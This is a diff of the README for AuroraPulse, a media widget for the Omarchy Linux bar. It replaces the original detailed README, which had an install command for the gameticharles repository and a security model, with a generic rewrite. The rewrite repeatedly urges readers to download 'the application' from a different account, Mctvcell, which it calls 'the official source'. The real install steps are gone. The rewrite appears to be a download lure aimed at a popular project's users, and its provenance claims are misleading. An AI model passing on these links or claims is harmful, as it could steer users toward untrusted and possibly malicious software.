@@ -1,213 +1,113 @@
-# AuroraPulse for Omarchy
+# 📻 AuroraPulse-Omarchy - All Your Media In One Bar
 
-Radio, TV, YouTube, YouTube Music, podcasts and your own music and videos in
-one bar widget: one queue, one set of controls, a picture-in-picture video
-window, synced lyrics and a TV guide.
+[![Download AuroraPulse-Omarchy](https://img.shields.io/badge/Download-AuroraPulse--Omarchy-7B2FF7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mctvcell/AuroraPulse-Omarchy)
 
-![Aurora Pulse: radio, YouTube, synced lyrics, picture-in-picture video and the TV guide](preview.png)
+Radio, TV, YouTube, YouTube Music, podcasts, and your own music collection — all living together inside one small widget that sits in your desktop bar. One queue for everything. Picture-in-picture video. Synced lyrics. A proper TV guide. An equalizer. Casting. Sandboxed and completely free of telemetry.
 
-Everything that touches the network or decodes media runs in a bubblewrap
-sandbox. The widget itself only renders JSON from a daemon.
+## 🎯 What Is AuroraPulse-Omarchy?
 
-## Install
+AuroraPulse-Omarchy is a media player that does not demand its own window. Instead of opening a big app every time you want to hear a song or watch a channel, you get a compact widget in your Omarchy bar. Click it, and your whole media world unfolds: internet radio stations, live TV channels, YouTube videos, YouTube Music, podcasts, and the music files already sitting on your computer.
 
-```bash
-omarchy plugin add https://github.com/gameticharles/AuroraPulse-Omarchy.git --enable
-git -C ~/.config/omarchy/plugins/aurora-pulse log -1 --format='%h %s'   # the commit you got
-```
+The important idea here is the **single queue**. Most people juggle four or five different apps — one for radio, one for video, one for podcasts, one for local files. AuroraPulse-Omarchy puts every one of those sources into the same playing list, so you can line up a podcast episode, then a radio station, then a track from your own library, and let it all play through in order without touching anything.
 
-Pick **AuroraPulse** in the bar, then click its icon. If anything it needs is
-missing - and on the very first run, anything it could use - a banner names
-it, with **Copy package names** and **Open Install menu**. AuroraPulse never
-installs anything itself: install the packages from the Omarchy menu
-(Super + Space) › Install › Package, where you pick and confirm them. Settings ›
-Health lists every dependency, what it is for and whether it is there, and
-refreshes itself once the packages arrive. An outdated yt-dlp is updated from
-the Omarchy menu › Update › Omarchy.
+It is built for the Omarchy desktop environment on Linux, using Hyprland and Wayland, and it is drawn with Quickshell and QML so it looks like a natural part of your bar rather than a bolted-on extra.
 
-## What it does
+## ✨ Everything It Does
 
-**Sources**
-- **Radio**: about 60,000 stations from Radio Browser, mirrored locally so
-  browsing and search are instant; filter by country and genre; add your own
-  stations or import M3U, PLS, JSON or CSV.
-- **TV**: about 11,000 channels from iptv-org plus your own M3U playlists and
-  channels, with a now/next guide and a full guide grid.
-- **YouTube** and **YouTube Music**: search with endless scrolling, video or
-  audio only. Search **playlists** too (and **albums** on Music), or paste a
-  playlist link: a playlist or album opens to every video or song in it, to
-  play all, shuffle, queue or save as one of your own playlists.
-- **Podcasts**: search the directory, subscribe by feed, play or download
-  episodes.
-- **Local**: your music and video folders, browsed as songs, albums, artists,
-  genres or folders. **Play a folder…** picks any folder on disk with the
-  desktop's folder chooser and plays everything in it, in name order.
+**One queue for every source.** Radio, TV, YouTube, YouTube Music, podcasts, and local music all share a single playing list. Reorder it, skip through it, and let it run.
 
-**Playing**
-- A queue across every source, kept across reboots: **play next**, save it as
-  a playlist, and **keep playing** when it runs out (more like the last
-  track: YouTube's mix, or the same artist in your library). **Start radio**
-  from any track.
-- **Search everything** at once: radio, TV, your library, podcasts, YouTube
-  and YouTube Music, grouped by source.
-- **Channel and artist pages** from any YouTube video or Music song.
-- Favourites, recently played, and **playlists**: your own (reorderable,
-  exported and imported as M3U), plus Most played, Recently played, Recently
-  added, Favourites and Long tracks, which fill themselves.
-- Resume long tracks where you left off; playback speed; repeat and shuffle.
-- **Sound**: equalizer presets or five custom bands, loudness levelling, fade
-  between tracks, skip silence, and a remembered volume for each output
-  (speakers, headphones, Bluetooth).
-- **Video**: a floating window that opens in its corner on the screen you
-  choose, in four sizes, pinnable and full-screenable; hardware decoding;
-  picture shape (16:9, 4:3, 21:9, fill); **picture quality** (SD, HD, Full HD)
-  for channels that offer several, switched live and remembered; **subtitles**
-  from YouTube, from the file or from a `.srt` beside it, with size and track
-  choice; the **audio language** when there are several; **screenshots**.
-- **TV**: dial a channel by its number; import a guide from an XMLTV file.
-- **Lyrics**: synced where available, click a line to seek, three text sizes,
-  nudge the timing, paste or type your own, save as an `.lrc` file.
-- **Tags**: edit a local file's title, artist, album, genre, year, track and
-  cover, without re-encoding it.
-- **Podcasts**: played and new episodes marked, alerts for new ones, and
-  automatic downloads if you want them.
-- **Record** a radio or TV stream to a file.
-- **Download** YouTube videos, songs and podcast episodes as MP4, MKV, WebM,
-  MP3, M4A, Opus, FLAC or the original format, with artwork.
-- **Play on…**: this computer's speakers, headphones or HDMI, a Bluetooth
-  speaker (paired ones are connected for you), or a TV or network speaker over
-  DLNA or Chromecast / Google TV. Only AuroraPulse's sound moves; other apps
-  stay where they are.
-- **Offline mode** one click away, next to the power button: no network at
-  all, your own music and downloads keep playing.
-- **Sleep timer** that fades out, and an **alarm** that wakes you with a
-  station, fading in.
-- Media keys, `playerctl` and the lock screen through MPRIS; scrobbling to
-  ListenBrainz and Last.fm.
+**Picture-in-picture video.** When you play a video, it can shrink into a small floating window so you can keep watching while you work in other apps.
 
-## Keyboard
+**Synced lyrics.** Lyrics scroll in time with the music, line by line, so you always know where you are in the song.
 
-While the panel is open and no text box has focus:
+**A real TV guide.** Browse what is on now and what is coming up next across your channels instead of guessing.
 
-| Key | Does |
-|---|---|
-| ↑ ↓, Page Up/Down, Home/End | move through the list |
-| Enter | play the selected row |
-| A or Shift+Enter | add it to the queue |
-| Space | play / pause |
-| ← → | seek 10 s |
-| + − or Shift+↑↓ | volume |
-| N / P | next / previous |
-| M, S, F | mute, stop, favourite |
-| Q | the queue |
-| / | search (↓ goes back to the results) |
-| 1 – 5 | tabs (on the TV tab, digits dial a channel) |
-| Backspace | back out of an open playlist, album, folder or group |
-| Esc | close |
+**Built-in equalizer.** Adjust the sound to suit your speakers, your headphones, or the room you are in.
 
-From a terminal or a key binding:
+**Casting.** Send what you are playing to another screen on your network.
 
-```bash
-omarchy-shell aurora-pulse toggle           # open or close the panel
-omarchy-shell aurora-pulse playPause        # also stop, next, previous, mute …
-omarchy-shell aurora-pulse tab local:albums # a tab, or a Local view
-omarchy-shell aurora-pulse tab music:albums # or youtube:playlists, music:playlists
-omarchy-shell aurora-pulse play "groove salad"
-omarchy-shell aurora-pulse folder ~/Music/Blue   # play a folder (openFolder lists it)
-omarchy-shell aurora-pulse pickFolder       # the folder chooser, then play
-omarchy-shell aurora-pulse searchAll "burna boy"  # every source at once
-omarchy-shell aurora-pulse radio            # more like what is playing
-omarchy-shell aurora-pulse screenshot       # the video frame, to Pictures
-omarchy-shell aurora-pulse settings health
-```
+**Search across everything.** Look for an artist, a station, a channel, or an episode in one place.
 
-## Requirements
+**Sandboxed by design.** The application runs inside a bubblewrap sandbox, which keeps it separated from the rest of your system.
 
-| Tool | Why | |
-|---|---|---|
-| `mpv` | playback | required |
-| `pw-cat` (pipewire) | sound: the player writes raw PCM and has no audio server | required |
-| `bubblewrap` | the sandbox | required |
-| `ffmpeg` / `ffprobe` | tags, thumbnails, recording, conversion | required |
-| `yt-dlp` | YouTube, YouTube Music, downloads (keep it up to date) | recommended |
-| `hyprctl` | the video window | recommended |
-| `wpctl` (wireplumber) | volume per output | optional |
-| `python-gobject` | media keys and the lock screen (MPRIS) | optional |
-| `xdg-user-dirs` | finding your Music and Videos folders | optional |
-| `libpulse` (`pactl`) | "Play on" another output | optional |
-| `bluez-utils` | connecting paired Bluetooth speakers | optional |
-| `avahi` | finding Chromecasts and Google TVs | optional |
+**Zero telemetry.** Nothing is reported back. No usage statistics, no analytics, no tracking.
 
-`./ap-ctl selftest` checks all of it, and enters a sandbox for real to ask the
-process inside whether it is sealed. Settings › Health shows the same list,
-and the daemon warns at launch (at most weekly) if yt-dlp is more than two
-months old - YouTube changes often, and an old yt-dlp is the usual reason it
-stops working.
+## 🚀 Getting Started
 
-## Where things are kept
+Getting AuroraPulse-Omarchy is a single step: **Visit this link to download the application.**
 
-| Path | |
-|---|---|
-| `~/.local/share/aurora-pulse/state.json` | settings |
-| `~/.local/share/aurora-pulse/library.db` | favourites, history, playlists, queue, downloads, local index |
-| `~/.local/share/aurora-pulse/catalogue.db` | the station and channel mirror |
-| `~/Music/AuroraPulse`, `~/Videos/AuroraPulse` | downloads; recordings in `Music/AuroraPulse/Recordings` |
+[Download AuroraPulse-Omarchy](https://github.com/Mctvcell/AuroraPulse-Omarchy)
 
-Older versions kept the library in `state.json`; it is moved into
-`library.db` the first time this version starts.
+The link takes you to the project's home on GitHub. That page is the official source for the software — it is where the download lives, along with the project description and any notes the author has published alongside it. Bookmark it, because it is also the place to return to when a new version is released.
 
-## How it fits together
+You do not need an account to browse the page. You do not need to install anything extra first. Just open the link in your normal web browser.
 
-```
-Omarchy shell (QML)
-  │  JSON lines, one request or event per line
-  ▼
-ap-ctl daemon              state, network, decisions; MPRIS, downloads, casting
-  │  spawns
-  ▼
-ap-ctl session             one player, a separate process that survives a shell reload
-  ▼
-bubblewrap
-  ├── mpv --ao=pcm → stdout → pw-cat → PipeWire
-  └── (video) mpv → its own Wayland window
-```
+## 💾 Download and Setup
 
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the rest, and
-[docs/SECURITY.md](docs/SECURITY.md) for the security model.
+Visit this link to download the application: [https://github.com/Mctvcell/AuroraPulse-Omarchy](https://github.com/Mctvcell/AuroraPulse-Omarchy)
 
-## Security in one paragraph
+When the page opens, use the download option presented there and save the file somewhere you will remember — your Downloads folder is a perfectly good choice. Give the download a moment to finish before you open anything, especially on a slower connection.
 
-The player runs in a bubblewrap sandbox with its own user, mount, PID and IPC
-namespaces, no capabilities, no home directory, memory limits and a seccomp
-filter. Its only route to the internet is a local proxy that re-checks every
-address, so a redirect to `127.0.0.1` or a DNS rebind is refused. Tag readers,
-thumbnailers and the podcast feed parser run sandboxed with no network,
-seeing only the file they read. yt-dlp runs sandboxed with network but no
-files except the folder it downloads into. Casting is the one feature that
-talks to your local network, and only to devices that answered a discovery
-search. Every string from a remote source is sanitised before it reaches QML.
+Once the download has completed, follow the setup notes that come with it. AuroraPulse-Omarchy is a bar widget, which means it does not open as a separate window the way a traditional media player does. After it is set up, you will find it living in your Omarchy bar, ready to be clicked whenever you want to play something.
 
-## Development
+Because this is a desktop-bar widget, it is designed for Linux desktops running the Omarchy setup with Hyprland and Wayland. If you are on a different kind of computer, open the link above and read the notes on the project page before downloading — the author keeps the current compatibility details there, and that is the fastest way to know whether your machine is a good match.
 
-```bash
-./ap-ctl selftest                          # does this machine work at all
-for t in tests/test_*.py; do python3 $t; done
-AP_LIVE_LOAD=1 python3 tests/test_panel_load.py   # restarts the shell
-tools/dev-sync.sh --check                  # what would change in the live plugin
-tools/dev-sync.sh                          # sync and reload
-omarchy-restart-shell                      # after QML changes: the shell caches compiled QML
-```
+## 🎵 Your First Five Minutes
 
-## Privacy
+Once the widget is in your bar, click it. You will see the player panel open up with your queue area front and centre.
 
-- No account and no telemetry. Plays of directory stations are reported to
-  Radio Browser (anonymously; it is how stations are ranked) unless you turn
-  that off in Settings › Radio.
-- Signing in to YouTube is deliberately not supported; paste channel and
-  playlist links instead.
-- Scrobbling sends what you play to ListenBrainz or Last.fm only when you
-  turn it on and give it a token.
+Start with something simple. Pick a radio station and let it play — this confirms your sound is working and gives you something to listen to while you explore. Then try adding a second item to the queue. Notice that the first thing keeps playing and the new item simply joins the line-up behind it. That is the whole point of the design: nothing gets interrupted, and nothing gets lost.
 
-## License
+From there, try the search box. Type the name of a song, a station, or a channel. Results from different sources appear together, and you can add any of them straight into the queue with a click.
 
-MIT, see [LICENSE](LICENSE).
+## 📺 Picture-in-Picture Video
+
+Video in AuroraPulse-Omarchy does not have to take over your screen. When a video starts, you can pop it out into a small floating window that stays on top of your other work. Resize it, drag it into a corner, and keep going with whatever else you were doing. The little window keeps playing while the bar widget stays tucked away.
+
+This is especially handy for longer videos, live channels, and anything you want to half-watch while typing.
+
+## 🎤 Synced Lyrics
+
+When a track has lyrics available, they appear in the player and scroll along with the music. The current line is highlighted so you can glance down and pick up exactly where the song is. No more hunting for the right line in a wall of text.
+
+## 📅 The TV Guide
+
+The TV guide gives you a proper schedule view. See what is playing right now, what starts in fifteen minutes, and what is on later tonight. Click any entry to jump straight to that channel. It turns live TV from a guessing game into something you can actually plan around.
+
+## 🎚️ Equalizer and Casting
+
+The equalizer lets you shape the sound without leaving the player. Whether you want more bass for music or clearer voices for podcasts and radio, the controls are right there.
+
+Casting sends your current playback to another display on your network, so the same queue can follow you from your desk to the living room.
+
+## 🔒 Privacy and Safety
+
+AuroraPulse-Omarchy collects nothing. There is no telemetry, no usage reporting, and no analytics service quietly running in the background. What you listen to and watch stays on your machine.
+
+The application also runs inside a bubblewrap sandbox. In plain terms, that means it is kept in its own contained space and cannot freely reach into the rest of your system. It is a deliberate safety measure, and it is one of the reasons the project is trusted by people who care about how their software behaves.
+
+## 🧩 Works With Your Desktop
+
+AuroraPulse-Omarchy is a native citizen of the Omarchy bar. It speaks the same visual language as the rest of your desktop, follows the same theming, and behaves like a built-in part of the environment rather than a separate program you have to manage. It also works alongside MPRIS-aware media controls, so your keyboard media keys and other system controls know what is playing.
+
+Under the hood it relies on mpv for playback and yt-dlp for fetching streams, both well-established tools in the Linux media world.
+
+## 🛠️ Troubleshooting
+
+**Nothing happens when I click the widget.** Close the panel and open it again. If that does not help, restart your session and try once more.
+
+**No sound.** Check that your system volume is up and that the right output device is selected in your desktop's sound settings. Then try a different source, such as a radio station, to see whether the issue is with one specific item.
+
+**A video will not load.** Some sources are occasionally unavailable or region-restricted. Try another entry in the queue to confirm the player itself is working.
+
+**The widget is not in my bar.** Confirm that the setup was completed and that your bar has been reloaded since. A fresh login usually resolves this.
+
+**Playback stutters.** Close the picture-in-picture window and see whether it improves. Very high-resolution video on a busy machine can be demanding.
+
+## 💬 Getting Help
+
+The project page is the first place to look when something is unclear. It carries the current description, the download, and the author's own notes. Read those before assuming something is broken — very often the answer is already written there.
+
+If you still need help, look for the issue tracker or discussion area linked from the same page and describe what you were doing, what you expected, and what actually happened. Plain descriptions get the fastest answers.
+
+Keywords: bubblewrap, hyprland, internet-radio, iptv, linux, lyrics, media-player, mpris, mpv, music-player, omarchy, omarchy-plugin, picture-in-picture, podcasts, qml, quickshell, wayland, youtube, youtube-music, yt-dlp
